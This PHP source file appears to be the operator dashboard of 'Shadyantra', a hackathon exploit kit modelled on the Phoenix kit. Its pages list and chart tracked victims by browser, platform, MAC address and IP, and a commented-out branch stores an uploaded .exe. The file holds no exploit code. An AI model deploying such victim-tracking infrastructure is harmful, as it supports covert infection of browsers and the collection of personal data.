<?php
require_once( "databasedetails.php" );
require_once( "databaseconnection.php" );
require_once( "getdetails.php" );
require_once("otherfunctions.php");

session_start( );
$connection=mysqli_connect( $DBHOST, $DBUSER, $DBPASS, $DBNAME ) ;
$linux="Linux";
$windows="Windows";
$firefox="Firefox";
$chrome="Chrome";
$msie="Internet Explorer";
$plinux=platform_infected($connection,$linux);
$pchrome=browser_infected($connection,$chrome);
$pfirefox=browser_infected($connection,$firefox);
$pmsie=browser_infected($connection,$msie);
$pwindows=platform_infected($connection,$windows);

if (( !isset( $_SESSION['pw'] ) || $_SESSION['pw'] != $ADMINPW ) and ( !isset( $_SESSION['login'] ) || $_SESSION['login'] != $ADMINLN ))
  {
        unset( $_SESSION['pw'] );
        unset( $_SESSION['login'] );
        if (( !isset( $_POST['pw'] ) ) and ( !isset( $_POST['login'] ) ))
      {
        			echo "<!DOCTYPE html>
<!-- saved from url=(0068)file:///C:/Users/Abhishek/Downloads/Compressed/login-form/index.html -->
<html><head><meta http-equiv='Content-Type' content='text/html; charset=UTF-8'>
  
  <title>Login Form</title>
  
  <link rel='stylesheet' href='./Login Form_files/reset.min.css'>

  
      <link rel='stylesheet' href='./Login Form_files/style.css'>

  
</head>

<body>
  
<div class='containmain' style='display: block;'>
  <div class='center'>
  <div class='profile'>
    
  </div>
  
  <form method='POST' class='form' action='#'  autocomplete='on'>
  <input type='password' class='bottomform' placeholder='Password' name='pw'><br>
  <input type='submit' value='Submit' onclick='javascript:document.getElementById(\"loginform\").submit();>
</form>
    </div>
</div>
  <script src='./Login Form_files/jquery.min.js.download'></script>

    <script src='./Login Form_files/index.js.download'></script>



</body></html>";
        			
    			}
		else
			{
        			$pw = sha1( $_POST['pw'] );
        			$login=sha1($_POST['login']);
        			$_SESSION['pw'] = $pw;
        			$_SESSION['login'] = $login;
        			redir( "?" );
    			}
    		exit();
}
@$act = @strtolower( @$_GET['go'] );
switch ( $act )
{
        case "import" :
     /*     if (isset( $_POST['upl'] ))
      {
                  $exe = file_get_contents( $_FILES['filename']['tmp_name'] );
                  WriteFile('ethwinalxmdzkujwxrg.exe',$exe);
                  redir( "?" );
            }
    else
      {
      	echo "";
      	echo "";
      }*/
    	echo "";
      break;


      case "logout" :
            unset( $_SESSION['pw'] );
            unset( $_SESSION['login'] );
    echo"<html><head><meta http-equiv='refresh' content='0;URL=guiek.php'></head></html>";
    break;
	    case "about" :
		echo "<!DOCTYPE html>
<!-- saved from url=(0043)http://getbootstrap.com/examples/dashboard/ --><html lang='en'><head><meta http-equiv='Content-Type' content='text/html; charset=UTF-8'><meta http-equiv='X-UA-Compatible' content='IE=edge'><meta name='viewport' content='width=device-width, initial-scale=1'><!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags --><meta name='description' content=''><meta name='author' content=''>
<link rel='icon' href='./Dashboard Template for Bootstrap_files/security.png'>
<title>Exploit kit</title>
    <!-- Bootstrap core CSS -->
    <link href='./Dashboard Template for Bootstrap_files/bootstrap.min.css' rel='stylesheet'>

    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    <link href='./Dashboard Template for Bootstrap_files/ie10-viewport-bug-workaround.css' rel='stylesheet'>
  <link rel='stylesheet' type='text/css' href='analytics.css's>
    <!-- Custom styles for this template -->
    <link href='./Dashboard Template for Bootstrap_files/dashboard.css' rel='stylesheet'>

    <!-- Just for debugging purposes. Don't actually copy these 2 lines! -->
    <!--[if lt IE 9]><script src='../../assets/js/ie8-responsive-file-warning.js'></script><![endif]-->
    <script src='./Dashboard Template for Bootstrap_files/ie-emulation-modes-warning.js.download'></script>

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src='https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js'></script>
      <script src='https://oss.maxcdn.com/respond/1.4.2/respond.min.js'></script>
    <![endif]-->
  </head>

  <body>

    <nav class='navbar navbar-inverse navbar-fixed-top'>
      <div class='container-fluid'>
        <div class='navbar-header'>
          <button type='button' class='navbar-toggle collapsed' data-toggle='collapse' data-target='#navbar' aria-expanded='false' aria-controls='navbar'>
            <span class='sr-only'>Toggle navigation</span>
            <span class='icon-bar'></span>
            <span class='icon-bar'></span>
            <span class='icon-bar'></span>
          </button>
 <a class='navbar-brand' href='#openModal'>Exploit Kit</a>
 </div>
        <div id='navbar' class='navbar-collapse collapse'>
          <ul class='nav navbar-nav navbar-right'>
            

            <div class='dropdown'>
  <button class='dropbtn' >Clear Statistics</button>
  <div class='dropdown-content'>
    <form method='POST' id='clearform'><input type='hidden' name='clear' value='Yes'><a href='#' class='red' onclick='javascript:document.getElementById(\"clearform\").submit();'>Yes</a><a class='red' href='guiek.php'>No</a></form>

  </div>
</div>
            <li><a href='install.php?go=install'>Settings</a></li>
            <li><a href='guiek.php?go=logout'>Logout</a></li>
          </ul>
          
        </div>
      </div>
    </nav>
    
    <div class='container-fluid'>
      <div class='row'>
        <div class='col-sm-3 col-md-2 sidebar'>
          <ul class='nav nav-sidebar'>
            <li><a href='guiek.php'>Dashboard</a></li>
            <li><a href='guiek.php?go=report'>Reports<span class='sr-only'>(current)</span></a></li>
            <li><a href='analytics.php'>Analytics</a></li>
            <li><a href='exploitdb.php'>Import</a></li>
          </ul>
          
          <ul class='nav nav-sidebar'>
            
            <li><a href='exploitselector.php' target='_blank'>Demo</a></li>
            <li class='active'><a href='guiek.php?go=about'>About</a></li>
          </ul>
          <br><br><br><br><br><br><br><br><h5 style='font-family: tahoma;color:#428bca'>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp CODE NAME</h5>
          <h4> &nbsp&nbsp&nbsp&nbsp SHADAYANTRA</h4>
        </div>
        <div class='col-sm-9 col-sm-offset-3 col-md-10 col-md-offset-2 main'>
            <h1 class='page-header'>About Exploit kit</h1>

          <div class='row placeholders'>
            <div class='col-xs-6 col-sm-3 placeholder'>
              <img src='logo.jpg' width='120' height='120' class='img-responsive' alt='Generic placeholder thumbnail'>
              <h1>SHADYANTRA<h1>
            </div>
           
          </div>         
<font font-family: 'Arial' color='grey'> <h2>Version 1.0  </h2></font>
<h4>Exploit kits are automated toolkits or frameworks designed to scan a victim's web browser, find vulnerabilities and then exploit them in order to deliver a malicious payload to the victim's machine.
 This Exploit kit is inspired by the original 'Phoenix Exploit Kit'.Exploit kit is a project created to make the possibility of malware analysis open and available to the public.
			  </h4>

<font color='grey'><h3>
           About Authors :
	</h3>
</font> <h5>
			   <p align='left'>
<b>BeetleStance</b><br>
				   <br></p></h5>
<b> Warning :</b> This Exploit kit is developed for non- hacking and educational purpose only. Only you are responsible for any harm done by this kit.
            
            </div>
          </div>
		  <div id='openModal' class='modalDialog'>
            <div>
              <div>
              <a href='#close' title='close' class='close'>X</a>
              <h1>Exploit Kit-Shadyantra</h1>
			  <img src=logo.jpg height=80 width 40><img src=ulogo.jpg height=80 width 40 align=right>
			  <p align=right><h2><b>Developed by:</b</h2><br><h3>Team GJUSTCS2: Smart India Hackathon '17</h3></p>
            </div>
            </div>
          </div>

          ";
        
    if ( isset( $_POST['clear'] ) )
            {
              mysqli_query( $connection,"TRUNCATE TABLE stats" );
            	echo"<html><head><meta http-equiv='refresh' content='0;URL=guiek.php?go='></head></html>";
            }
            break;
			
        case "" :
        echo "<!DOCTYPE html>
<!-- saved from url=(0043)http://getbootstrap.com/examples/dashboard/ --><html lang='en'><head><meta http-equiv='Content-Type' content='text/html; charset=UTF-8'><meta http-equiv='X-UA-Compatible' content='IE=edge'><meta name='viewport' content='width=device-width, initial-scale=1'><!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags --><meta name='description' content=''><meta name='author' content=''>
<link rel='icon' href='./Dashboard Template for Bootstrap_files/security.png'>
<title>Exploit kit</title>
    <!-- Bootstrap core CSS -->
    <link href='./Dashboard Template for Bootstrap_files/bootstrap.min.css' rel='stylesheet'>

    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    <link href='./Dashboard Template for Bootstrap_files/ie10-viewport-bug-workaround.css' rel='stylesheet'>
  <link rel='stylesheet' type='text/css' href='analytics.css's>
    <!-- Custom styles for this template -->
    <link href='./Dashboard Template for Bootstrap_files/dashboard.css' rel='stylesheet'>

    <!-- Just for debugging purposes. Don't actually copy these 2 lines! -->
    <!--[if lt IE 9]><script src='../../assets/js/ie8-responsive-file-warning.js'></script><![endif]-->
    <script src='./Dashboard Template for Bootstrap_files/ie-emulation-modes-warning.js.download'></script>

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src='https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js'></script>
      <script src='https://oss.maxcdn.com/respond/1.4.2/respond.min.js'></script>
    <![endif]-->
  </head>

  <body>

    <nav class='navbar navbar-inverse navbar-fixed-top'>
      <div class='container-fluid'>
        <div class='navbar-header'>
          <button type='button' class='navbar-toggle collapsed' data-toggle='collapse' data-target='#navbar' aria-expanded='false' aria-controls='navbar'>
            <span class='sr-only'>Toggle navigation</span>
            <span class='icon-bar'></span>
            <span class='icon-bar'></span>
            <span class='icon-bar'></span>
          </button>
 <a class='navbar-brand' href='#openModal'>Exploit Kit</a>
 </div>
        <div id='navbar' class='navbar-collapse collapse'>
          <ul class='nav navbar-nav navbar-right'>
            

            <div class='dropdown'>
  <button class='dropbtn' >Clear Statistics</button>
  <div class='dropdown-content'>
    <form method='POST' id='clearform'><input type='hidden' name='clear' value='Yes'><a href='#' class='red' onclick='javascript:document.getElementById(\"clearform\").submit();'>Yes</a><a class='red' href='guiek.php'>No</a></form>

  </div>
</div>
            <li><a href='install.php?go=install'>Settings</a></li>
            <li><a href='guiek.php?go=logout'>Logout</a></li>
          </ul>
          
        </div>
      </div>
    </nav>
    
    <div class='container-fluid'>
      <div class='row'>
        <div class='col-sm-3 col-md-2 sidebar'>
          <ul class='nav nav-sidebar'>
            <li class='active'><a href='guiek.php'>Dashboard</a></li>
            <li><a href='guiek.php?go=report'>Reports<span class='sr-only'>(current)</span></a></li>
            <li><a href='analytics.php'>Analytics</a></li>
            <li><a href='exploitdb.php'>Import</a></li>
          </ul>
          
          <ul class='nav nav-sidebar'>
            
            <li><a href='exploitselector.php' target='_blank'>Demo</a></li>
            <li><a href='guiek.php?go=about'>About</a></li>
          </ul>
          <br><br><br><br><br><br><br><br><h5 style='font-family: tahoma;color:#428bca'>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp CODE NAME</h5>
          <h4> &nbsp&nbsp&nbsp&nbsp SHADAYANTRA</h4>
        </div>
        <div class='col-sm-9 col-sm-offset-3 col-md-10 col-md-offset-2 main'>
          <h1 class='page-header'>Dashboard</h1>

          <div class='row placeholders'>
            <div class='col-xs-6 col-sm-3 placeholder'>
              <img src='./Dashboard Template for Bootstrap_files/Windows.png' width='200' height='200' class='img-responsive' alt='Generic placeholder thumbnail'>
              
            </div>
            <div class='col-xs-6 col-sm-3 placeholder'>
              <img src='./Dashboard Template for Bootstrap_files/mac.png' width='200' height='200' class='img-responsive' alt='Generic placeholder thumbnail'>
              
            </div>
            <div class='col-xs-6 col-sm-3 placeholder'>
              <img src='./Dashboard Template for Bootstrap_files/linux.png' width='200' height='200' class='img-responsive' alt='Generic placeholder thumbnail'>
              
            </div>
            <div class='col-xs-6 col-sm-3 placeholder'>
              <img src='./Dashboard Template for Bootstrap_files/android.png' width='200' height='200' class='img-responsive' alt='Generic placeholder thumbnail'>
              
            </div>
          </div>

          <h2 class='sub-header'>Overview</h2>
          <div class='table-responsive'>
            <table class='table table-striped'>
              <thead>
                <tr>
                  <th>ID</th>
                  <th>BROWSER</th>
                  <th>BROWSER VERSION</th>
                  <th>PLATFORM</th>
                  <th>MAC ADDRESS</th>
                  <th>VICTIM'S IP</th>
                </tr>
              </thead>
           <div id='openModal' class='modalDialog'>
            <div>
              <div>
              <a href='#close' title='close' class='close'>X</a>
              <h1>Exploit Kit-Shadyantra</h1>
			  <img src=logo.jpg height=80 width 40><img src=ulogo.jpg height=80 width 40 align=right>
			  <p align=right><h2><b>Developed by:</b</h2><br><h3>Team GJUSTCS2: Smart India Hackathon '17</h3></p>
            </div>
            </div>
          </div>";
        $i = 1;
        $total_id = total_no_of_hits($connection);
            for ( ; $i <= $total_id; $i++ )
        {
          $starr = gettable( $connection,$i );

              echo "<tr".( $i % 2 == 0 ? " class='dark'" : "" )."><td>{$starr[0]}</td><td>{$starr[1]}</td><td>{$starr[2]}</td><td>{$starr[3]}</td><td>{$starr[4]}</td><td>{$starr[5]}</td></tr>";
            }

    if ( isset( $_POST['clear'] ) )
            {
              mysqli_query( $connection,"TRUNCATE TABLE stats" );
            	echo"<html><head><meta http-equiv='refresh' content='0;URL=guiek.php?go='></head></html>";
            }
            break;


            case "analytics":
              # code...
            echo "";
            $i = 1;
			$total_id = total_no_of_hits($connection);
            for ( ; $i <= $total_id+1; $i++ )
			{
			$starr = gettable( $connection,$i );

             echo "";
            }
             break;


              case "report":
                # code...
              echo "<!DOCTYPE html>
<!-- saved from url=(0043)http://getbootstrap.com/examples/dashboard/ -->
<html lang='en'><head><meta http-equiv='Content-Type' content='text/html; charset=UTF-8'>
    
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1'>
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <meta name='description' content=''>
    <meta name='author' content=''>
    <link rel='icon' href='./Dashboard Template for Bootstrap_files/security.png'>

    <title>Exploit kit</title>
  <link rel='stylesheet' type='text/css' href='analytics.css's>

    <!-- Bootstrap core CSS -->
    <link href='./Dashboard Template for Bootstrap_files/bootstrap.min.css' rel='stylesheet'>

    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    <link href='./Dashboard Template for Bootstrap_files/ie10-viewport-bug-workaround.css' rel='stylesheet'>

    <!-- Custom styles for this template -->
    <link href='./Dashboard Template for Bootstrap_files/dashboard.css' rel='stylesheet'>

    <!-- Just for debugging purposes. Don't actually copy these 2 lines! -->
    <!--[if lt IE 9]><script src='../../assets/js/ie8-responsive-file-warning.js'></script><![endif]-->
    <script src='./Dashboard Template for Bootstrap_files/ie-emulation-modes-warning.js.download'></script>

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src='https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js'></script>
      <script src='https://oss.maxcdn.com/respond/1.4.2/respond.min.js'></script>
    <![endif]-->
	<meta http-equiv='Content-Type' content='text/html; charset=utf-8'>
        <title>amCharts examples</title>
        <link rel='stylesheet' href='style.css' type='text/css'>
        <script src='./amcharts/amcharts.js' type='text/javascript'></script>
        <script src='./amcharts/pie.js' type='text/javascript'></script>

        <script>var chart;var chartData = [{'country': 'United States','visits': 0},{'country': 'China','visits': 0},{'country': 'Linux','visits': '{$plinux}'},{'country': 'Germany','visits': 0},{'country': 'United Kingdom','visits': 0},{'country': 'France','visits': 0},{'country': 'India','visits': 0},{'country': 'Windows','visits': '{$pwindows}'}];        AmCharts.ready(function () {// PIE CHART 
        chart = new AmCharts.AmPieChart();
        // title of the chart
                chart.addTitle('Platform Detected', 16);
                chart.dataProvider = chartData;
                chart.titleField = 'country';
                chart.valueField = 'visits';
                chart.sequencedAnimation = true;
                chart.startEffect = 'elastic';
                chart.innerRadius = '30%';
                chart.startDuration = 2;
                chart.labelRadius = 15;
                chart.balloonText = '[[title]]<br><span style=\'font-size:14px\'><b>[[value]]</b> ([[percents]]%)</span>';
                // the following two lines makes the chart 3D
                chart.depth3D = 10;
                chart.angle = 15;
                // WRITE
                chart.write('chartdiv');
            });
        </script>
        <script>var chartm;var chartDatam = [{'country': 'United States','visits': 0},{'country': 'Chrome','visits': '{$pchrome}'},{'country': 'Linux','visits': ''},{'country': 'Germany','visits': 0},{'country': 'United Kingdom','visits': 0},{'country': 'France','visits': 0},{'country': 'Firefox','visits': '{$pfirefox}'},{'country': 'MS IE','visits': '{$pmsie}'}];        AmCharts.ready(function () {// PIE CHART 
        chart = new AmCharts.AmPieChart();
        // title of the chart
                chart.addTitle('Browser Detected', 16);
                chart.dataProvider = chartDatam;
                chart.titleField = 'country';
                chart.valueField = 'visits';
                chart.sequencedAnimation = true;
                chart.startEffect = 'elastic';
                chart.innerRadius = '30%';
                chart.startDuration = 2;
                chart.labelRadius = 15;
                chart.balloonText = '[[title]]<br><span style=\'font-size:14px\'><b>[[value]]</b> ([[percents]]%)</span>';
                // the following two lines makes the chart 3D
                chart.depth3D = 10;
                chart.angle = 15;
                // WRITE
                chart.write('chartdivm');
            });
        </script>
  </head>
  

  <body>

    <nav class='navbar navbar-inverse navbar-fixed-top'>
      <div class='container-fluid'>
        <div class='navbar-header'>
          <button type='button' class='navbar-toggle collapsed' data-toggle='collapse' data-target='#navbar' aria-expanded='false' aria-controls='navbar'>
            <span class='sr-only'>Toggle navigation</span>
            <span class='icon-bar'></span>
            <span class='icon-bar'></span>
            <span class='icon-bar'></span>
          </button>
  <a class='navbar-brand' href='#openModal'>Exploit Kit</a>
 </div>
        <div id='navbar' class='navbar-collapse collapse'>
          <ul class='nav navbar-nav navbar-right'>           

            <div class='dropdown'>
  <button class='dropbtn' >Clear Statistics</button>
  <div class='dropdown-content'>
    <form method='POST' id='clearform'><input type='hidden' name='clear' value='Yes'><a href='#' class='red' onclick='javascript:document.getElementById(\"clearform\").submit();'>Yes</a><a class='red' href='guiek.php'>No</a></form>

  </div>
</div>
            <li><a href='install.php?go=install'>Settings</a></li>
            <li><a href='guiek.php?go=logout'>Logout</a></li>
          </ul>
          
        </div>
      </div>
    </nav>
    <div class='container-fluid'>
      <div class='row'>
        <div class='col-sm-3 col-md-2 sidebar'>
          <ul class='nav nav-sidebar'>
            <li><a href='guiek.php'>Dashboard</a></li>
            <li class='active'><a href='guiek.php?go=report'>Reports</a></li>
            <li><a href='analytics.php'>Analytics</a></li>
            <li><a href='exploitdb.php'>Import</a></li>
          </ul>
          
          <ul class='nav nav-sidebar'>
            <li><a href='exploitselector.php' target='_blank'>Demo</a></li>
            <li><a href='guiek.php?go=about'>About</a></li>
          </ul>
          <br><br><br><br><br><br><br><br><h5 style='font-family: tahoma;color:#428bca'>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp CODE NAME</h5>
          <h4> &nbsp&nbsp&nbsp&nbsp SHADAYANTRA</h4>
        </div>
        <div class='col-sm-9 col-sm-offset-3 col-md-10 col-md-offset-2 main'>
          <h1 class='page-header'>Reports</h1>

          <div class='row placeholders'>
            <div class='col-xs-6 col-sm-3 placeholder'>
               <body>
        <div id='chartdiv' style='width:600px; height:400px;'></div>
    </body>
              
            </div>
            <div class='col-xs-6 col-sm-3 placeholder'>
                         
            </div>
            <div class='col-xs-6 col-sm-3 placeholder'>
              <body>
        <div id='chartdivm' style='width:600px; height:400px;'></div>
    </body>   
              
            </div>
            <div class='col-xs-6 col-sm-3 placeholder'>
              <img src='./Dashboard Template for Bootstrap_files/android.png' width='0' height='0' class='img-responsive' alt='Generic placeholder thumbnail'>
            </div>
          </div>
          <div class='table-responsive'>
            <table class='table table-striped'>
             <thread>
             <tr>
                  <th>ID</th>
                  <th>BROWSER</th>
                  <th>BROWSER VERSION</th>
                  <th>PLATFORM</th>
                  <th>MAC ADDRESS</th>
                  <th>VICTIM'S IP</th>
                </tr>
              </thead>
           <div id='openModal' class='modalDialog'>
            <div>
              <a href='#close' title='close' class='close'>X</a>
              <h1>Exploit Kit-Shadyantra</h1>
			  <img src=logo.jpg height=80 width 40><img src=ulogo.jpg height=80 width 40 align=right>
			  <p align=right><h2><b>Developed by:</b</h2><br><h3>Team GJUSTCS2: Smart India Hackathon '17</h3></p>
            </div>
          </div>";
        $i = 1;
        $total_id = total_no_of_hits($connection);
            for ( ; $i <= $total_id; $i++ )
        {
          $starr = getTable( $connection,$i );

              echo "<tr".( $i % 2 == 0 ? " class='dark'" : "" )."><td>{$starr[0]}</td><td>{$starr[1]}</td><td>{$starr[2]}</td><td>{$starr[3]}</td><td>{$starr[4]}</td><td>{$starr[5]}</td></tr>";
            }
    if ( isset( $_POST['clear'] ) )
            {
              mysqli_query( $connection,"TRUNCATE TABLE stats" );
              echo"<html><head><meta http-equiv='refresh' content='0;URL=guiek.php'></head></html>";
            }       break;
 
}

        ?>